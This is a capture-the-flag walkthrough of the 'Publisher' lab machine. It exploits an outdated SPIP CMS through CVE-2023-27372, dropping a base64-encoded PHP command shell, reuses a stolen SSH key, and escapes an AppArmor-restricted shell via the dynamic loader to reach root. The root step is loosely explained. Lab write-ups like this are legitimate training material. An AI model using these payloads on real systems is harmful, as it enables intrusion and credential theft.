## Description

The **Publisher** CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.

## Gain a Flag

### Enumaration

#### Nmap Scan

```

```

Theres two open ports

- 22/SSH
- 80/HTTP

At `MACHINE_IP` we found a static page about `SPIP CMS`

![Web Page](page.PNG)

#### What is the user flag?

Using [Gobuster](https://www.kali.org/tools/gobuster/) we found one directory leads to another clue `/spip`, that shows installation of SPIP CMS

then using [WhatWeb](https://www.kali.org/tools/whatweb/) will give us another clue, that shows version of SPIP is outdated 

![SPIP Version](1-version.PNG)
_SPIP Version 4.2.0_

Did some research online and found about the [exploit](https://github.com/nuts7/CVE-2023-27372) and PoC of the Vulnerabilities which is `Remote Code Execution`

Use the exploit that found on the github, and procced using this command : ~

```
┌──(root㉿amca)-[/home/amca/CVE-2023-27372]
└─# python3 CVE-2023-27372.py -u http://publisher.thm/spip/ -c 'echo PD89YCRfR0VUW2NtZF1gPz4= | base64 -d > shell.php'
```

> -u SPIP application base URL
> -c Command to Execute

now we got shell on the website to make our job easier
> `http://publisher.thm/spip/shell.php`

### Examining the Filesystem

Notice theres `.ssh` directory inside the `/home/think`, I think maybe we can access using ssh key ?

Downloading the `id_rsa` key and testing it against the SSH service as the `think` user, we get a shell on the host.

```
ssh -i amca_key think@MACHINE_IP
think@publisher:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

nice one, using this much easier

### What is the root flag?

Looking for any binaries with a `SUID` bit set, we found `/usr/sbin/run_container`

Using `strings` i have found that it actually executes a bash script from the `/opt` folder

![](2.jpg)

We have write permissions on `/opt/run_container.sh`

```
think@publisher:~$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10 12:40 /opt/run_container.sh
But if we try to write to it, we get permission denied.
```

Using [Linpeas] to gain more info, that's when we found that `AppArmor` is enabled and our shell is not `bash` but `ash`, then we also see that there is an AppArmor profile for our current shell

![](3.PNG)

Now lets use kernel library to spawn an unconfined bash shell

`/ld-linux-x86–64.so.2 /bin/bash`

When this command is executed, it uses the specified `dynamic linker/loader (ld-linux-x86–64.so.2)` to load the required shared libraries and start the `/bin/bash` shell. This method of invoking the linker/loader directly with a binary is a way to execute a binary by explicitly specifying the dynamic linker/loader to use for that particular binary.

then run the file we found earlier `run_container.sh`, and we're `r00t`

## Conclusion

Stress a lil bit, but its a fun room. 

## Happy Hacking
